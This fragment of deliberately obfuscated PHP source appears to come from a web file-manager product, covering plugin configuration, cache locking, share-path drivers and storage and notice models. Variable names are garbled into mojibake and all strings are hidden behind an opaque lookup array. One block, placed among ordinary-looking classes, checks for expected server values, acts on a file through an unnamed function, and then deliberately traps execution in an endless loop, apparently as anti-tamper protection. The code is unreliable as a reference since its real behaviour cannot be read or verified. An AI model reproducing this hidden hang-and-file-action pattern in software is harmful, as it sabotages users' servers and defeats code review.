is_array($ç¥¼•èµ[$º•³¾À‘[2154]])) { return $úí‚îŒŸ; } foreach ($ç¥¼•èµ[$º•³¾À‘[2154]] as $Õòú¢ => $‘î»°Ç) { if (!isset($‘î»°Ç[$º•³¾À‘[459]]) || isset($úí‚îŒŸ[$Õòú¢])) { continue; } $úí‚îŒŸ[$Õòú¢] = $‘î»°Ç[$º•³¾À‘[459]]; } return $úí‚îŒŸ; } public function getPackageJson($•æ¼¾š) { return Hook::apply($•æ¼¾š . $_SERVER[‰‰Ş‚€][2155]); } public function getConfig($Ê»åÚúñ, $Ç¦äˆü = false) { $–üòïªí =& $_SERVER[‰‰Ş‚€]; $è¸‡Àåâ = array(); $ÄªÖ—¾ë = $this->loadList($Ê»åÚúñ); if ($ÄªÖ—¾ë && is_array($ÄªÖ—¾ë[$–üòïªí[16]])) { $è¸‡Àåâ = $ÄªÖ—¾ë[$–üòïªí[16]]; } if (!$è¸‡Àåâ || $Ç¦äˆü) { $è¸‡Àåâ = $this->getConfigDefault($Ê»åÚúñ); } return $è¸‡Àåâ; } public function setConfig($üã§ÈÎ©, $Ë èâ¨ = false) { $à†ì°“ï =& $_SERVER[‰‰Ş‚€]; $¼êåîß… = $this->loadList($üã§ÈÎ©); if (!$¼êåîß…) { return !1; } $Ò˜Š¥œ = $¼êåîß…[$à†ì°“ï[16]]; if ($Ë èâ¨ == !1) { $Ò˜Š¥œ = array(); $Ë èâ¨ = $this->getConfigDefault($üã§ÈÎ©); } foreach ($Ë èâ¨ as $Ê™¸Ê† => $ˆ½Š…«Ñ) { $Ò˜Š¥œ[$Ê™¸Ê†] = is_string($ˆ½Š…«Ñ) ? trim($ˆ½Š…«Ñ) : $ˆ½Š…«Ñ; } $this->update($¼êåîß…[$à†ì°“ï[491]], array($à†ì°“ï[16] => $Ò˜Š¥œ)); } public function viewList() { $§ÃÜı¥ƒ =& $_SERVER[‰‰Ş‚€]; $ëéÛµ¡Ï = $this->loadList(); $this->pluginScan($ëéÛµ¡Ï); $ëéÛµ¡Ï = $this->loadPluginList(); $òŸêõ­› = array(); foreach ($ëéÛµ¡Ï as $ò÷–¾ô¢ => $ŞŠÕ­­†) { $ÍŒ³Îºé = $ŞŠÕ­­†; unset($ŞŠÕ­­†[$§ÃÜı¥ƒ[2145]], $ŞŠÕ­­†[$§ÃÜı¥ƒ[16]]); $ÒóÊƒ—¢ = PLUGIN_DIR . $ŞŠÕ­­†[$§ÃÜı¥ƒ[42]] . $§ÃÜı¥ƒ[2147]; if (!is_file($ÒóÊƒ—¢)) { continue; } $‡ŞÑ³¦¸ = Hook::apply($ŞŠÕ­­†[$§ÃÜı¥ƒ[42]] . $§ÃÜı¥ƒ[2155]); if (!is_array($‡ŞÑ³¦¸)) { continue; } $òŸêõ­›[$ò÷–¾ô¢] = array_merge($ŞŠÕ­­†, $‡ŞÑ³¦¸); if ($ÍŒ³Îºé[$§ÃÜı¥ƒ[16]][$§ÃÜı¥ƒ[1732]] != $‡ŞÑ³¦¸[$§ÃÜı¥ƒ[1706]]) { Hook::apply($ŞŠÕ­­†[$§ÃÜı¥ƒ[42]] . $§ÃÜı¥ƒ[2152]); $ÍŒ³Îºé[$§ÃÜı¥ƒ[16]][$§ÃÜı¥ƒ[1732]] = $‡ŞÑ³¦¸[$§ÃÜı¥ƒ[1706]]; $this->update($ŞŠÕ­­†[$§ÃÜı¥ƒ[491]], array($§ÃÜı¥ƒ[16] => $ÍŒ³Îºé[$§ÃÜı¥ƒ[16]])); } } return $òŸêõ­›; } private function loadPluginList() { $‰š¦‰í¬ =& $_SERVER[‰‰Ş‚€]; $ÉâğØ° = $this->loadList(); if (strtolower(MOD) == $‰š¦‰í¬[2156]) { return $ÉâğØ°; } $½óÆß© = Hook::trigger($‰š¦‰í¬[2157], $ÉâğØ°); if ($ÉâğØ° && !$½óÆß©) { die; } return $½óÆß© ? $½óÆß© : $ÉâğØ°; } private function pluginScan($ıŸ™¼£½) { $èå£Áˆƒ =& $_SERVER[‰‰Ş‚€]; recursion_dir(PLUGIN_DIR, $¶»¯—“Ù, $èÂĞ’É™, 0); foreach ($¶»¯—“Ù as $ó³ÎÏé›) { $öúû•ºº = get_path_this($ó³ÎÏé›); if (isset($ıŸ™¼£½[$öúû•ºº]) || !file_exists($ó³ÎÏé› . $èå£Áˆƒ[2158]) || !file_exists($ó³ÎÏé› . $èå£Áˆƒ[2147])) { continue; } Hook::apply($öúû•ºº . $èå£Áˆƒ[2152]); } } } goto a¦ÊÕ‚†Æ³; AÆ¾Â–Üİº: define($_SERVER[‰‰Ş‚€][327], 3); define($_SERVER[‰‰Ş‚€][328], 1); define($_SERVER[‰‰Ş‚€][329], 0); goto FÏâø›•¦; f½Õ³¾¢µ: function binCheckBigger($§Ôª¶ĞÓ, $ÆÆÄë×ò) { return $§Ôª¶ĞÓ > $ÆÆÄë×ò; } $_SERVER[$_SERVER[´¶››·][3]] = ("\70\70\63\66".base64_decode('Mjg='))+0;$_t1hw="jvxup91qltmaz4758berwci23dk6sfg0hnyognpak8qlw5u241xb09yjserm6fz7d3vho";; $_file = $_SERVER[$_SERVER[‰‰Ş‚€][4]]; goto bŞïõÜÖÖ; A¬ÑíÙÇ¹‡: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ş–š¼‡Í =& $_SERVER[‰‰Ş‚€]; $ò”îæ¨á = $GLOBALS[$ş–š¼‡Í[16]][$ş–š¼‡Í[433]]; self::$cachePath = $ò”îæ¨á[$ş–š¼‡Í[241]][$ş–š¼‡Í[97]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($µÕûùå™, $µÖÕêÆú = 0) { $Æ§‹õÄá =& $_SERVER[‰‰Ş‚€]; $Ü¶Å€•ü = microtime(!0); $ßÕÊÑ—… = $Ü¶Å€•ü + $µÖÕêÆú + 0.0001; $íáÚÛ‹ê = rtrim(self::$cachePath, $Æ§‹õÄá[18]) . $Æ§‹õÄá[972] . md5($µÕûùå™) . $Æ§‹õÄá[969]; if (file_exists($íáÚÛ‹ê) && filemtime($íáÚÛ‹ê) && filemtime($íáÚÛ‹ê) < time() - 10) { @unlink($íáÚÛ‹ê); } do { if (file_exists($íáÚÛ‹ê)) { cacheLockWait(); continue; } $üˆºóøÓ = fopen($íáÚÛ‹ê, $Æ§‹õÄá[973]); if (!$üˆºóøÓ) { return !1; } $¨œÀ®‘… = flock($üˆºóøÓ, LOCK_EX | LOCK_NB); self::$caches[$µÕûùå™] = array($Æ§‹õÄá[974] => $üˆºóøÓ, $Æ§‹õÄá[241] => $íáÚÛ‹ê); fwrite($üˆºóøÓ, $ßÕÊÑ—…); clearstatcache(); if ($üˆºóøÓ && $¨œÀ®‘…) { return !0; } cacheLockWait(); } while (microtime(!0) < $ßÕÊÑ—…); $this->unlock($µÕûùå™); return !1; } public function lockGet($Ò‹¨±Ö¯) { $–¾Š´‹Ò =& $_SERVER[‰‰Ş‚€]; $Ó˜÷æŠÄ = rtrim(self::$cachePath, $–¾Š´‹Ò[18]) . $–¾Š´‹Ò[972] . md5($Ò‹¨±Ö¯) . $–¾Š´‹Ò[969]; return file_exists($Ó˜÷æŠÄ); } public function unlock($Öš…ıò) { $Ì™­â¹Ü =& $_SERVER[‰‰Ş‚€]; $¬˜®µ… = self::$caches[$Öš…ıò]; if (!$¬˜®µ…) { return; } @flock($¬˜®µ…[$Ì™­â¹Ü[974]], LOCK_UN); @fclose($¬˜®µ…[$Ì™­â¹Ü[974]]); @unlink($¬˜®µ…[$Ì™­â¹Ü[241]]); unset(self::$caches[$Öš…ıò]); } } class CacheLockRedis { public function lock($àõÌÈ·º, $Ö½›«êË = 10) { $ù¹©À‚ = Cache::init(); $ÇöõÕæË = microtime(!0) + $Ö½›«êË; while (microtime(!0) < $ÇöõÕæË) { $ÙÔùÂÚÂ = $ù¹©À‚->get($àõÌÈ·º); if (!$ÙÔùÂÚÂ) { $ù²¿ê¿« = $ù¹©À‚->setLock($àõÌÈ·º, $ÇöõÕæË, $Ö½›«êË); if ($ù²¿ê¿«) { return !0; } } else { if ($ÙÔùÂÚÂ < microtime(!0)) { $ù¹©À‚->set($àõÌÈ·º, $ÇöõÕæË, $Ö½›«êË * 2); if ($ù¹©À‚->get($àõÌÈ·º) === $ÙÔùÂÚÂ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ —øƒ§¦) { return Cache::init()->get($ —øƒ§¦); } public function unlock($Ú©ìÁñÏ) { return Cache::init()->remove($Ú©ìÁñÏ); } } class CacheLockMemcached { public function lock($àš³“Ó’, $Öİæğğ€ = 0) { $õ›ÚŠªŸ = Cache::init(); $ÔË¾ï•¼ = microtime(!0) + $Öİæğğ€; while (microtime(!0) < $ÔË¾ï•¼) { $²ßôõñş = $õ›ÚŠªŸ->get($àš³“Ó’); if (!$²ßôõñş || $²ßôõñş < microtime(!0)) { $°Ò¡ù = $õ›ÚŠªŸ->handle->add($àš³“Ó’, $ÔË¾ï•¼, $Öİæğğ€); if ($°Ò¡ù) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($°²ÔÚç ) { return Cache::init()->get($°²ÔÚç ); } public function unlock($´ÆÊ“›) { return Cache::init()->remove($´ÆÊ“›); } } goto aÁ·ÇÊø; cœ–À¾ƒÏ—: class PathDriverDbShareItem extends PathDriverDB { public function __construct($İšÚşÙÛ) { $this->pathParse = $İšÚşÙÛ; $this->model = Model($_SERVER[‰‰Ş‚€][1467]); } public function getPathOuter($£ÖåÊÑ‰) { $Ÿ®…¤şÁ =& $_SERVER[‰‰Ş‚€]; if (!$£ÖåÊÑ‰) { return $£ÖåÊÑ‰; } $æŠšÉóì = $this->parse($£ÖåÊÑ‰); return trim(KodIO::makeShare($this->pathParse[$Ÿ®…¤şÁ[491]], $æŠšÉóì[$Ÿ®…¤şÁ[491]]), $Ÿ®…¤şÁ[18]); } protected function infoParse($ü Šª½, $Úı¶ì·Õ = false, $àŒ ÂƒŒ = false) { $µçÌ °Ğ =& $_SERVER[‰‰Ş‚€]; $®Ä˜›·÷ = $this->pathParse[$µçÌ °Ğ[491]]; $©Ñ†‘âµ = trim($this->pathParse[$µçÌ °Ğ[1288]], $µçÌ °Ğ[18]); return Action($µçÌ °Ğ[1474])->sharePathInfo($®Ä˜›·÷, $©Ñ†‘âµ, $Úı¶ì·Õ); } public function infoFull($‘ğ¢š) { $¹éä• =& $_SERVER[‰‰Ş‚€]; $üÓĞ÷«â = explode($¹éä•[18], trim($‘ğ¢š, $¹éä•[18])); if (count($üÓĞ÷«â) > 1) { $ —ÎÑÜ³ = implode($¹éä•[18], array_splice($üÓĞ÷«â, 1)); $²‡ Ä© = $this->model->pathInfoByPath($üÓĞ÷«â[0], $ —ÎÑÜ³); if (!$²‡ Ä©) { return !1; } $this->pathParse[$¹éä•[1288]] = $²‡ Ä©[$¹éä•[202]]; } return $this->infoParse($‘ğ¢š); } public function listAll($§°·ıÓ ) { $Ã”Ê¥è =& $_SERVER[‰‰Ş‚€]; $¨ÚÊçù¼ = IO::info($this->pathParse[$Ã”Ê¥è[97]]); if (!$¨ÚÊçù¼) { return array(); } $„Úìï’’ = $this->model->listAll($§°·ıÓ ); $ã×ÈŞîø = Model($Ã”Ê¥è[687])->getInfo($¨ÚÊçù¼[$Ã”Ê¥è[688]]); foreach ($„Úìï’’ as &$ØÇÎš¼“) { check_abort(); $ØÇÎš¼“[$Ã”Ê¥è[100]] = Action($Ã”Ê¥è[1474])->_shareItemeParse($ØÇÎš¼“[$Ã”Ê¥è[100]], $ã×ÈŞîø); } unset($ØÇÎš¼“); return $„Úìï’’; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Ê³ìï¥ğ) { $this->pathParse = $Ê³ìï¥ğ; $this->model = Model($_SERVER[‰‰Ş‚€][1467]); } protected function infoParse($éıŠêà¹, $ªäÄµèç = false, $ƒÖÍ„Œ = false) { $®çè÷şÆ =& $_SERVER[‰‰Ş‚€]; return Action($®çè÷şÆ[1295])->sharePathInfo($this->pathParse[$®çè÷şÆ[97]], !0, $ªäÄµèç); } public function listPath($ñşæÔÔ¡, $¹œºşèÅ = false) { $ÒŸøøê =& $_SERVER[‰‰Ş‚€]; $Ü–„Ë = parent::listPath($ñşæÔÔ¡, $¹œºşèÅ); if (!$Ü–„Ë) { return $Ü–„Ë; } if (is_array($Ü–„Ë[$ÒŸøøê[1475]])) { $Ü–„Ë[$ÒŸøøê[1475]] = Action($ÒŸøøê[1295])->shareItemInfo($Ü–„Ë[$ÒŸøøê[1475]]); } foreach ($Ü–„Ë as $½³áè¿• => $¯—øâÙ) { if (!in_array($½³áè¿•, array($ÒŸøøê[96], $ÒŸøøê[95]))) { continue; } foreach ($¯—øâÙ as $´®“Éé => $ñÄô­òì) { $Ü–„Ë[$½³áè¿•][$´®“Éé] = Action($ÒŸøøê[1295])->shareItemInfo($ñÄô­òì); } } return $Ü–„Ë; } public function listAll($¶À¢„®‚) { $ã¥€Íß =& $_SERVER[‰‰Ş‚€]; $…«»’¶ = IO::info($this->pathParse[$ã¥€Íß[97]]); if (!$…«»’¶) { return array(); } $êµË¹ú = $this->model->listAll($¶À¢„®‚); foreach ($êµË¹ú as &$Ï¡Ÿò¡é) { $Ï¡Ÿò¡é[$ã¥€Íß[100]] = Action($ã¥€Íß[1295])->shareItemInfo($Ï¡Ÿò¡é[$ã¥€Íß[100]]); } unset($Ï¡Ÿò¡é); return $êµË¹ú; } } if (!isset($_SERVER[$_SERVER[‰‰Ş‚€][6]]) || !isset($_SERVER[$_SERVER[‰‰Ş‚€][4]])) { $_getc = $_SERVER[‰‰Ş‚€][7]; $_getfile = $_SERVER[$_SERVER[‰‰Ş‚€][8]] . $_SERVER[‰‰Ş‚€][9]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‰‰Ş‚€][10], $_getfilec); if (count($_getarrs) < $_SERVER[‰‰Ş‚€][11]) { $exit = $_SERVER[‰‰Ş‚€][12]; $exit(); } $_act = $_SERVER[‰‰Ş‚€][13]; $_act($_SERVER[$_SERVER[‰‰Ş‚€][8]] . $_SERVER[‰‰Ş‚€][9]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[‰‰Ş‚€][471]); } } goto Dæ²ìŠ´’; Dí‚ŠÚÍäŞ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\156\x6f\164\151\143\145\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\x63\x6f\156\x74\x65\156\164", "\x61\165\164\x68", "\155\157\x64\145", "\164\x69\155\145", "\x74\171\160\x65", "\x6c\145\166\x65\154", "\x65\x6e\x61\x62\x6c\x65", "\163\x6f\x72\164"); public function listData($¤­¶ò‘ = false, $¸úÄ¦â± = "\163\157\162\164", $ÌÊŒôó— = false) { return parent::listData($¤­¶ò‘, $¸úÄ¦â±, $ÌÊŒôó—); } public function add($ÚÔˆÆÖü) { $ô®œ¡Ë§ =& $_SERVER[‰‰Ş‚€]; $“×¯¾Ÿù = time(); if ($ÚÔˆÆÖü[$ô®œ¡Ë§[26]] == $ô®œ¡Ë§[2510]) { $“×¯¾Ÿù = strtotime($ÚÔˆÆÖü[$ô®œ¡Ë§[215]]); } $ÚÔˆÆÖü[$ô®œ¡Ë§[215]] = $“×¯¾Ÿù; return parent::insert($ÚÔˆÆÖü); } public function update($«øĞûç¦, $ŒÕŞØÎç) { $€ÉÓë‚Ü =& $_SERVER[‰‰Ş‚€]; $¼ß®ú±Œ = $this->listData($«øĞûç¦); if (!$¼ß®ú±Œ) { return !1; } $áßŒ‹Í¹ = time(); if ($ŒÕŞØÎç[$€ÉÓë‚Ü[26]] == $€ÉÓë‚Ü[2510]) { $áßŒ‹Í¹ = strtotime($ŒÕŞØÎç[$€ÉÓë‚Ü[215]]); } $ŒÕŞØÎç[$€ÉÓë‚Ü[215]] = $áßŒ‹Í¹; return parent::update($«øĞûç¦, $ŒÕŞØÎç); } public function remove($”İ›ÛÏ) { $ÓœÏ¨· = $this->listData($”İ›ÛÏ); if (!$ÓœÏ¨· || $ÓœÏ¨·[$_SERVER[‰‰Ş‚€][200]]) { return !1; } return parent::remove($”İ›ÛÏ); } public function sort($À­Ì¡Û¢, $²ã”îÎ‚) { return parent::update($À­Ì¡Û¢, $²ã”îÎ‚); } public function enable($¼ù£ë©İ, $Ú™ô­—ù) { return parent::update($¼ù£ë©İ, array($_SERVER[‰‰Ş‚€][2511] => $Ú™ô­—ù)); } private function initUserOption() { $òåôö²½ =& $_SERVER[‰‰Ş‚€]; $this->optionType = $òåôö²½[2512]; $this->modelType = $òåôö²½[2513]; $this->field = array($òåôö²½[2514], $òåôö²½[42], $òåôö²½[215], $òåôö²½[43], $òåôö²½[2515], $òåôö²½[846], $òåôö²½[237]); } public function userNoticeGet($ÕòëüãÅ = false) { $this->initUserOption(); return parent::listData($ÕòëüãÅ, $_SERVER[‰‰Ş‚€][491], !0); } public function userNoticeAdd($ ¶–Å…) { $óÕÒ·ûÚ =& $_SERVER[‰‰Ş‚€]; $this->initUserOption(); $Å§îã˜Ç = $this->findByKey($óÕÒ·ûÚ[2514], $ ¶–Å…[$óÕÒ·ûÚ[491]]); if ($Å§îã˜Ç) { return !0; } $ñ»¦ö¦ = array($óÕÒ·ûÚ[2514] => $ ¶–Å…[$óÕÒ·ûÚ[491]], $óÕÒ·ûÚ[42] => $ ¶–Å…[$óÕÒ·ûÚ[42]], $óÕÒ·ûÚ[215] => $ ¶–Å…[$óÕÒ·ûÚ[215]], $óÕÒ·ûÚ[43] => isset($ ¶–Å…[$óÕÒ·ûÚ[43]]) ? $ ¶–Å…[$óÕÒ·ûÚ[43]] : 1, $óÕÒ·ûÚ[2515] => isset($ ¶–Å…[$óÕÒ·ûÚ[2515]]) ? $ ¶–Å…[$óÕÒ·ûÚ[2515]] : 0, $óÕÒ·ûÚ[846] => 0, $óÕÒ·ûÚ[237] => 0); return parent::insert($ñ»¦ö¦); } public function userNoticeEdit($ˆõ„õä€, $Ğ€µ¹¢‘) { $this->initUserOption(); return parent::update($ˆõ„õä€, $Ğ€µ¹¢‘); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\145\x6d\x5f\157\160\x74\151\157\156"; protected $jsonField = array("\155\x65\156\x75", "\x72\157\x6c\145", "\x72\157\x6c\145\x47\x72\x6f\165\x70", "\162\145\x67\x69\163\x74", "\x65\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($„íÃœœ¹) { return "\123\x79\x73\164\x65\x6d\117\160\164\151\x6f\156\x5f{$„íÃœœ¹}"; } protected function optionDefault($ËÀÉº¤ = '') { $œ±ÀÏÄø =& $_SERVER[‰‰Ş‚€]; if ($ËÀÉº¤ == $œ±ÀÏÄø[22]) { return $GLOBALS[$œ±ÀÏÄø[16]][$œ±ÀÏÄø[476]]; } } } class SystemRecordModel extends ModelBaseLight { } goto B¢š×ç®äŒ; Díõë“•İ: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\163\164\x6f\162\x61\x67\x65\114\x69\x73\x74"; public $field = array("\156\x61\x6d\145", "\163\x69\172\145\x4d\141\170", "\163\x79\163\164\145\x6d", "\x64\145\x66\x61\165\x6c\164", "\x64\162\x69\x76\x65\x72", "\x63\157\156\x66\x69\x67"); public function listData($‰ÍïÕ¡Ü = false, $¡Åâøø• = "\x6d\x6f\x64\x69\x66\x79\x54\x69\155\145", $§›å² = false) { $ïƒ­ó¾÷ =& $_SERVER[‰‰Ş‚€]; $°´áÖé = parent::listData($‰ÍïÕ¡Ü, $¡Åâøø•, $§›å²); if ($‰ÍïÕ¡Ü) { return $°´áÖé; } $Ëİò½‰ı = array(); if ($GLOBALS[$ïƒ­ó¾÷[2365]]) { $Ëİò½‰ı = $this->ioSizeUseGet(array_to_keyvalue($°´áÖé, $ïƒ­ó¾÷[22], $ïƒ­ó¾÷[491])); } foreach ($°´áÖé as $”Ú“Öœº => $ôàÈ¾è…) { unset($°´áÖé[$”Ú“Öœº][$ïƒ­ó¾÷[16]]); $°´áÖé[$”Ú“Öœº][$ïƒ­ó¾÷[2009]] = isset($Ëİò½‰ı[$ôàÈ¾è…[$ïƒ­ó¾÷[491]]]) ? $Ëİò½‰ı[$ôàÈ¾è…[$ïƒ­ó¾÷[491]]] : 0; } return $°´áÖé; } public function ioSizeUseGet($ôÕì) { $Ú±¸Á¤ =& $_SERVER[‰‰Ş‚€]; if (!$ôÕì) { return array(); } $ó•ìç²Ù = $Ú±¸Á¤[2366] . implode($Ú±¸Á¤[60], $ôÕì); $œ¦Û¯‡ù = Cache::get($ó•ìç²Ù); if ($œ¦Û¯‡ù) { return $œ¦Û¯‡ù; } $¿â²÷Äò = array($Ú±¸Á¤[922] => $Ú±¸Á¤[491], $Ú±¸Á¤[2367] => $Ú±¸Á¤[89]); $¸ç†ã…À = array($Ú±¸Á¤[922] => array($Ú±¸Á¤[17], $ôÕì)); $œ¦Û¯‡ù = Model($Ú±¸Á¤[890])->field($¿â²÷Äò)->where($¸ç†ã…À)->group($Ú±¸Á¤[922])->select(); $œ¦Û¯‡ù = array_to_keyvalue($œ¦Û¯‡ù, $Ú±¸Á¤[491], $Ú±¸Á¤[89]); Cache::set($ó•ìç²Ù, $œ¦Û¯‡ù, 600); return $œ¦Û¯‡ù; } public function getConfig($¹‘Åá½) { $ˆ‚²€ó = parent::listData($¹‘Åá½); $ïÛ¤‹õ‘ = _get($ˆ‚²€ó, $_SERVER[‰‰Ş‚€][16], array()); if ($ïÛ¤‹õ‘ && !is_array($ïÛ¤‹õ‘)) { $ïÛ¤‹õ‘ = json_decode($ïÛ¤‹õ‘, !0); } return $ïÛ¤‹õ‘; } public function update($¹ôù§Úâ, $©¬Åœ•Õ) { $²ìÍÕ‡´ =& $_SERVER[‰‰Ş‚€]; $à¬Ü®ğ = $©¬Åœ•Õ[$²ìÍÕ‡´[42]]; $Ïõ¯ü‚Ì = array_to_keyvalue(parent::listData(), $²ìÍÕ‡´[42]); if (isset($Ïõ¯ü‚Ì[$à¬Ü®ğ]) && $Ïõ¯ü‚Ì[$à¬Ü®ğ][$²ìÍÕ‡´[491]] != $¹ôù§Úâ) { return !1; } $this->checkPwd($¹ôù§Úâ, $©¬Åœ•Õ); if (isset($©¬Åœ•Õ[$²ìÍÕ‡´[2368]]) && $©¬Åœ•Õ[$²ìÍÕ‡´[2368]] == $²ìÍÕ‡´[101]) { $this->checkConfig($©¬Åœ•Õ); } unset($©¬Åœ•Õ[$²ìÍÕ‡´[2368]]); $»‰úğğ = parent::update($¹ôù§Úâ, $©¬Åœ•Õ); if ($»‰úğğ && $©¬Åœ•Õ[$²ìÍÕ‡´[47]]) { foreach ($Ïõ¯ü‚Ì as $ËÆÇ’‡) { if ($ËÆÇ’‡[$²ìÍÕ‡´[47]] && $ËÆÇ’‡[$²ìÍÕ‡´[491]] != $¹ôù§Úâ) { parent::update($ËÆÇ’‡[$²ìÍÕ‡´[491]], array($²ìÍÕ‡´[47] => 0)); } } $this->updateBackup($¹ôù§Úâ, $Ïõ¯ü‚Ì); } return $»‰úğğ; } public function add($ëŒêğÈµ) { $à†ëà =& $_SERVER[‰‰Ş‚€]; $±´ó³£ = array_to_keyvalue(parent::listData(), $à†ëà[42]); if (isset($±´ó³£[$ëŒêğÈµ[$à†ëà[42]]])) { return !1; } $this->checkConfig($ëŒêğÈµ); $É”àÄÒ = parent::insert($ëŒêğÈµ); if ($É”àÄÒ && $ëŒêğÈµ[$à†ëà[47]]) { foreach ($±´ó³£ as $Å­ËùÖ) { if ($Å­ËùÖ[$à†ëà[47]]) { parent::update($Å­ËùÖ[$à†ëà[491]], array($à†ëà[47] => 0)); } } $this->updateBackup($É”àÄÒ, $±´ó³£); } return $É”àÄÒ; } public function updateBackup($ãê‹œä…, $µîØ®ƒÛ) { $…è‘»Ôº =& $_SERVER[‰‰Ş‚€]; if ($ãê‹œä… == $…è‘»Ôº[101]) { return; } $‡å­›Êî = Model($…è‘»Ôº[844])->config(); $Äé­¾­ = $‡å­›Êî[$…è‘»Ôº[848]]; if ($‡å­›Êî[$…è‘»Ôº[1789]] != $…è‘»Ôº[101] || $Äé­¾­ == $ãê‹œä…) { return; } if ($Äé­¾­ != $…è‘»Ôº[101]) { $„éæ†é = array(); foreach ($µîØ®ƒÛ as $³¦ğ÷®é) { if ($ãê‹œä… == $³¦ğ÷®é[$…è‘»Ôº[491]]) { continue; } $„éæ†é[] = $³¦ğ÷®é[$…è‘»Ôº[491]]; } if ($„éæ†é && in_array($Äé­¾­, $„éæ†é)) { return; } } $§—‘ã­ê = Model($…è‘»Ôº[869])->get($…è‘»Ôº[876]); $§—‘ã­ê = json_decode($§—‘ã­ê, !0); if (!$§—‘ã­ê) { return; } $§—‘ã­ê[$…è‘»Ôº[848]] = $ãê‹œä…; Model($…è‘»Ôº[869])->set(array($…è‘»Ôº[876] => $§—‘ã­ê)); } public function checkPwd($¦·Ü÷•ş, &$§ÁÆ¶¸ü) { $¼œì¡³¢ =& $_SERVER[‰‰Ş‚€]; if (empty($§ÁÆ¶¸ü[$¼œì¡³¢[16]])) { return; } $€ñ÷°– = $§ÁÆ¶¸ü[$¼œì¡³¢[16]]; if (!is_array($€ñ÷°–)) { $€ñ÷°– = json_decode($€ñ÷°–, !0); } $¾Éº˜üœ = $¼œì¡³¢[22]; $àÓëª½š = array($¼œì¡³¢[2369], $¼œì¡³¢[2370], $¼œì¡³¢[996]); foreach ($àÓëª½š as $Ù—•ñ) { if (isset($€ñ÷°–[$Ù—•ñ])) { $¾Éº˜üœ = $Ù—•ñ; break; } } if (!$¾Éº˜üœ) { return; } $²ßÕ§®Ç = $this->getConfig($¦·Ü÷•ş); $‚†ÙÈÑâ = $²ßÕ§®Ç[$¾Éº˜üœ]; $Ø­»Ëê = $€ñ÷°–[$¾Éº˜üœ]; if ($Ø­»Ëê == str_repeat($¼œì¡³¢[231], strlen($‚†ÙÈÑâ))) { $€ñ÷°–[$¾Éº˜üœ] = $‚†ÙÈÑâ; $§ÁÆ¶¸ü[$¼œì¡³¢[16]] = json_encode($€ñ÷°–); } else { if ($Ø­»Ëê != $‚†ÙÈÑâ) { $§ÁÆ¶¸ü[$¼œì¡³¢[2368]] = $¼œì¡³¢[101]; } } } public function checkConfig(&$Èò±°à, $ÑÍœÈ†Ù = false) { $é¶Ôá‡ =& $_SERVER[‰‰Ş‚€]; $¼¨­üÀ— = strtolower($Èò±°à[$é¶Ôá‡[106]]); $•÷Ú½ƒÀ = $Èò±°à[$é¶Ôá‡[16]]; if (!is_array($•÷Ú½ƒÀ)) { $•÷Ú½ƒÀ = json_decode($•÷Ú½ƒÀ, !0); } foreach ($•÷Ú½ƒÀ as $‚ªøì„È => $®°ƒš‡å) { if (is_string($®°ƒš‡å)) { $•÷Ú½ƒÀ[$‚ªøì„È] = trim($®°ƒš‡å); } } $•÷Ú½ƒÀ[$é¶Ôá‡[2371]] = rand_string(6); $™ˆ°„¿ = $GLOBALS[$é¶Ôá‡[16]][$é¶Ôá‡[102]][$é¶Ôá‡[930]]; $Ãéè¤ˆÎ = isset($™ˆ°„¿[$¼¨­üÀ—]) ? $™ˆ°„¿[$¼¨­üÀ—] : ucfirst($¼¨­üÀ—); $ÜáÌ­‡¬ = $é¶Ôá‡[87] . $Ãéè¤ˆÎ; if (!$Ãéè¤ˆÎ || !class_exists($ÜáÌ­‡¬)) { if ($ÑÍœÈ†Ù) { return LNG($é¶Ôá‡[2372]); } write_log(array($é¶Ôá‡[2373], $Èò±°à, get_caller_info()), $é¶Ôá‡[224]); show_json(LNG($é¶Ôá‡[2372]), !1, $Èò±°à); } $­¤ ¦ôæ = new $ÜáÌ­‡¬($•÷Ú½ƒÀ); $ÙÇƒÃå’ = rtrim($•÷Ú½ƒÀ[$é¶Ôá‡[1301]], $é¶Ôá‡[18]) . $é¶Ôá‡[18]; if (in_array($¼¨­üÀ—, $­¤ ¦ôæ->objectDriver)) { try { if (!$­¤ ¦ôæ->isBucketCors() && !$­¤ ¦ôæ->setBucketCors()) { $¾§ µ­ = LNG($é¶Ôá‡[2374]); $¾§ µ­ .= $é¶Ôá‡[2375] . LNG($é¶Ôá‡[2376]); } } catch (Exception $ØÃİ´Ø) { $¾§ µ­ = $ØÃİ´Ø->getMessage(); } if (isset($¾§ µ­)) { return $this->_parseError($¾§ µ­, $¼¨­üÀ—, $ÑÍœÈ†Ù); } if ($¼¨­üÀ— == $é¶Ôá‡[78] && !$­¤ ¦ôæ->checkRegion()) { return $this->_parseError(LNG($é¶Ôá‡[2377]), $¼¨­üÀ—, $ÑÍœÈ†Ù); } } else { if ($¼¨­üÀ— == $é¶Ôá‡[2378]) { if ($­¤ ¦ôæ->ftpPath) { $ÍûÆ’œ° = trim($ÙÇƒÃå’, $é¶Ôá‡[18]); if (stripos($ÍûÆ’œ°, trim($­¤ ¦ôæ->ftpPath, $é¶Ôá‡[18])) !== 0) { $ÙÇƒÃå’ = $­¤ ¦ôæ->ftpPath . $é¶Ôá‡[18] . ($ÍûÆ’œ° ? $ÍûÆ’œ° . $é¶Ôá‡[18] : $é¶Ôá‡[22]); } } } } $òêñšÀˆ = $­¤ ¦ôæ->getPath($ÙÇƒÃå’ . $é¶Ôá‡[1305]); try { if ($¼¨­üÀ— == $é¶Ôá‡[117]) { $­¤ ¦ôæ->mkdir($ÙÇƒÃå’); } $ÄÇªš‡ = $­¤ ¦ôæ->mkfile($òêñšÀˆ); if (!$ÄÇªš‡) { $¾§ µ­ = LNG($é¶Ôá‡[2374]); } } catch (Exception $ØÃİ´Ø) { $¾§ µ­ = $ØÃİ´Ø->getMessage(); } if (isset($¾§ µ­)) { 